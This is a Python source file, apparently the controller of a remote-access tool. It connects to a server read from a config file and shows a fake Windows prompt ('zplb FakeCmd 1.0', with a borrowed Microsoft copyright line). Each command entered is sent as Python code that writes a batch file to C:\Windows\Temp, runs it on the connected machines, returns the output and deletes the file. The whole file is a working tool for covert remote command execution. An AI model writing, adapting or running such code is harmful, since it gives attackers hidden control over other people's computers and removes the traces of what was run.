# -*- coding: utf-8 -*-
import os

import socket
import sys
import threading
import time

def getStartSpace(dm):#获取tab空格数
    a = 0
    for i in dm:
        if i == ' ':
            a += 1
        elif i != ' ':
            break
    return a
def getEndSpace(dm):#与上面得相反
    dm = dm[::-1]
    a = 0
    for i in dm:
        if i == ' ':
            a += 1
        elif i != ' ':
            break
    return a
def cutEndSpace(dm):#删除后面的空格
    sz = getEndSpace(dm)
    if sz == 0:
        return dm
    else:
        return dm[:-sz]
def cutStartSpace(dm):#删除tab
    sz = getStartSpace(dm)
    if sz == 0:
        return dm
    else:
        return dm[sz:]
rd = open('./config/lj.txt','r',encoding='utf-8').read().split(',')
ip = rd[0]
port = int(rd[1])
ip_port = (ip,port)

sk=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sk.connect(ip_port)
lj = 'C:\\Users'
def js():
    while True:
        date=sk.recv(8192)#接受信息
        content = date.decode('utf-8')
        if content[:5] == 'king:':
            continue
        if content[:5] == 'user:':
            continue
        else:
            print(date.decode('utf-8'))

sw=threading.Thread(target=js)
sw.setDaemon(1)
sw.start()
print('''Microsoft Windows [zplb FakeCmd 1.0]
(c) Microsoft Corporation.
''')
while True:
    time.sleep(0.5)
    date=input(lj+'>');dt = 'king:'+date
    if date == 'cls':
        os.system('cls')
        continue
    if date == 'cmd':
        print('''Microsoft Windows [zplb FakeCmd 1.0]
(c) Microsoft Corporation.
        ''')
        continue
    elif date[:6] == 'title ':
        os.system('title '+date[6:])
        continue
    elif date == 'exit':
        sys.exit()
    elif cutStartSpace(date)[:2] == 'cd':
        cd = cutStartSpace(cutStartSpace(cutEndSpace(date))[2:])
        if ''.join(cd.split(' ')) == '..':
            lj = '\\'.join(lj.split('\\')[:-1])
            if lj == 'C:':
                lj = 'C:\\'
            if lj == '':
                lj = 'C:\\'
        elif ''.join(cd.split(' ')) == '.':
            pass
        elif cd[1] == ':':
            lj = cd
            if lj == 'C:':
                lj = 'C:\\'
            if lj == '':
                lj = 'C:\\'
        else:
            lj += '\\'+cd
            if lj == 'C:':
                lj = 'C:\\'
            if lj == '':
                lj = 'C:\\'
    else:
        run = "open('C:\\\\Windows\\\\Temp\\\\run.bat', 'w', encoding='utf-8').write('cd '+'"+lj.replace('\\','\\\\')+"'+'&&'+'"+date.replace('\\','\\\\')+"')"+'\n'+"send('\\n'+os.popen('C:\\\\Windows\\\\Temp\\\\run.bat').read()+'\\n')"+'\n'+'os.remove("C:\\\\Windows\\\\Temp\\\\run.bat")'
        nr = 'king:run:'+run
        sk.send(nr.encode(encoding='utf-8'))
sk.close#结束连接
